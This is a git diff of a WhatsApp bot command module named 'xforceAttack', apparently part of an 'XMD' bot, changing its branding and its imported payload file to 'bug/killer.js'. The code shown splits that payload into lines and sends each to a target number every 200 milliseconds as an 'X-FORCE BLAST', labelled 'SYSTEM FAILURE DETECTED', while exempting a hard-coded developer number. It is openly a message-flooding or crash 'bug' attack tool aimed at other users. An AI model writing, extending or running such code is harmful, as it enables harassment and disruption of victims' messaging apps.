@@ -1,11 +1,11 @@
-import notif4 from '../../bug/inconnu5.js';
+import notif4 from '../../bug/killer.js';
 import config from '../../config.cjs';
 
 const xforceAttack = async (message, sock) => {
   const prefix = config.PREFIX;
   const botNumber = await sock.decodeJid(sock.user.id);
   const isOwner = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net'].includes(message.sender);
-  const forbiddenNumber = ['554488138425']; // protection du Dev
+  const forbiddenNumber = ['254769677305']; // protection du Dev
 
   const cmd = message.body.startsWith(prefix)
     ? message.body.slice(prefix.length).split(' ')[0].toLowerCase()
@@ -37,7 +37,7 @@ const xforceAttack = async (message, sock) => {
     return await sock.sendMessage(
       message.from,
       {
-        text: `🛡️ This number is protected by INCONNU-XD. Attack blocked.`,
+        text: `🛡️ This number is protected by TERROR-XMD-. Attack blocked.`,
       },
       { quoted: message }
     );
@@ -58,7 +58,7 @@ const xforceAttack = async (message, sock) => {
   const messages = notif4.split('\n').filter(Boolean);
   for (let i = 0; i < messages.length; i++) {
     await sock.sendMessage(target, {
-      text: `🔺 *X-FORCE BLAST #${i + 1}* 🔻\n${messages[i]}\n\n_⚠️ SYSTEM FAILURE DETECTED_\n~INCONNU XD V2~`,
+      text: `🔺 *X-FORCE BLAST #${i + 1}* 🔻\n${messages[i]}\n\n_⚠️ SYSTEM FAILURE DETECTED_\n~TERROR-XMD-~`,
     });
     await new Promise((resolve) => setTimeout(resolve, 200));
   }
